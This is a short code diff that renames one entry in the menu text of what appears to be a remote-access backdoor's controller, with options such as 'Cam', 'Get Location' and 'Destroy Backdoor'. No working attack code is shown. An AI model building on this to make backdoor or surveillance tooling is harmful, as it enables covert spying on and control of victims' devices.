@@ -10,7 +10,7 @@ class options():
             5 - Cam
             6 - Get Location
             7 - Destroy Backdoor
-            8 - Agent Info
+            8 - Connection Info
             q - Quit
             """
     
